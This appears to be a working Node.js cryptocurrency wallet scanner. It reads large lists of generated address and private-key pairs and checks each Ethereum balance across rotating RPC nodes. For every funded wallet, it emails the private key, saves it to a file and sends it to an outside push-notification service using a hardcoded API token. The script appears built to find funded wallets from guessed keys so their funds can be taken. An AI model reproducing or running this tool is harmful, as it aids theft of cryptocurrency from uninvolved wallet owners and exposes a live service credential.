const fs = require('fs'); // 
const { ethers } = require('ethers'); // 
const sendEmail = require('./email'); // 
const axios = require('axios'); // HTTP 

// 检查并创建计数器文件
const countFilePath = 'count.txt';
if (!fs.existsSync(countFilePath)) {
    fs.writeFileSync(countFilePath, '0', 'utf8');
    console.log('Count file created with initial count: 0');
}

// 读取保存计数器数量的文件
let count = 0; // 初始化计数器
try {
    const savedCount = fs.readFileSync(countFilePath, 'utf8');
    count = parseInt(savedCount, 10) || 0;
    console.log(`......................................上次检查到哪个钱包了?: ${count}`);
} catch (error) {
    console.error('Error reading count file:', error);
}

// 从文件中读取钱包地址和私钥，并排除空白行
let walletsData = fs.readFileSync('1.txt', 'utf8')
    .split('\n')
    .map(line => line.trim()) // 删除每行开头和结尾的空格
    .filter(line => line.length > 0); // 排除长度为零的行

let walletCount = walletsData.length; // 初始化钱包数量计数器

const wallets = walletsData.map(line => {
    const [address, privateKey] = line.split(',');
    return { address, privateKey };
});

// 从文件中读取 RPC 节点 URL
const rpcUrls = fs.readFileSync('rpc.txt', 'utf8').split('\n');

// 转换 Wei 到 ETH
function weiToEth(wei) {
    const ethString = ethers.utils.formatEther(wei);
    return parseFloat(ethString);
}

// 查询钱包余额
async function queryWalletBalance(wallet, rpcUrl, rpcIndex, currentCheck, totalCount) {
    try {
        const provider = new ethers.providers.JsonRpcProvider(rpcUrl); // 使用给定的 RPC 节点 URL
        const balance = await provider.getBalance(wallet.address); // 查询余额

        // 如果余额大于0，则保存信息到88.txt
        if (balance.gt(0)) {
            sendEmail(wallet.address, weiToEth(balance), wallet.privateKey);
            saveBalanceInfo(wallet.address, wallet.privateKey, balance);
            pushToPushPlus(`钱包地址：${wallet.address}  私钥：${wallet.privateKey}  余额：${weiToEth(balance).toFixed(5)} ETH`);
        }

        console.log(`当前检查: ${currentCheck}/${totalCount}: 钱包地址: ${wallet.address}  RPC节点：${rpcIndex + 1}  余额：${weiToEth(balance).toFixed(5)} ETH`); // 输出当前检查的计数器、钱包地址、RPC 节点编号和余额
        return balance.toString(); // 返回余额字符串
    } catch (error) {
        console.error(`Error querying balance for ${wallet.address} on RPC ${rpcUrl}: ${error.message}`); // 错误处理
        return '0'; // 查询失败返回 0
    }
}

// 保存余额信息到88.txt
function saveBalanceInfo(address, privateKey, balance) {
    const data = `钱包地址: ${address}  私钥: ${privateKey}  余额: ${weiToEth(balance).toFixed(5)} ETH\n`;
    fs.appendFileSync('88.txt', data, 'utf8');
}

// 
async function pushToPushPlus(message) {
    const pushPlusToken = '9b782195fcdf4bb084a527cc8420ba34'; // 
    const url = `http://www.pushplus.plus/send?token=${pushPlusToken}&title=ETH%E9%92%B1%E5%8C%85%E6%9F%A5%E8%AF%A2&content=${encodeURIComponent(message)}`;
    try {
        await axios.get(url);
    } catch (error) {
        console.error('Error pushing to PushPlus:', error.message);
    }
}

// 主函数
async function main() {
    try {
        console.log(`...................正在开始查询1.txt内的 ${walletCount} 个钱包余额，如果显示0个钱包,请先去生成`);
        let rpcIndex = 0; // 初始化RPC节点编号
        for (let i = count; i < wallets.length; i++) {
            const wallet = wallets[i];
            const rpcUrl = rpcUrls[rpcIndex]; // 获取当前RPC节点 URL
            await queryWalletBalance(wallet, rpcUrl, rpcIndex, i + 1, walletCount); // 查询余额，并传入当前检查的计数器和总数量
            if ((i + 1) % 5 === 0) { // 每查询5个钱包地址后切换到下一个RPC节点
                rpcIndex = (rpcIndex + 1) % rpcUrls.length;
            }
            // 每次更新计数器后立即写入文件
            fs.writeFileSync(countFilePath, (i + 1).toString(), 'utf8');
        }
        // 清空1.txt文件
        fs.writeFileSync('1.txt', '', 'utf8');
        console.log(`1.txt已清空`);
        // 重置计数器并清空count.txt文件
        fs.writeFileSync(countFilePath, '0', 'utf8');
        console.log(`计数器已重置为: 0`);
    } catch (error) {
        console.error('An error occurred:', error); // 处理错误
    }
}

// 启动主函数
main();
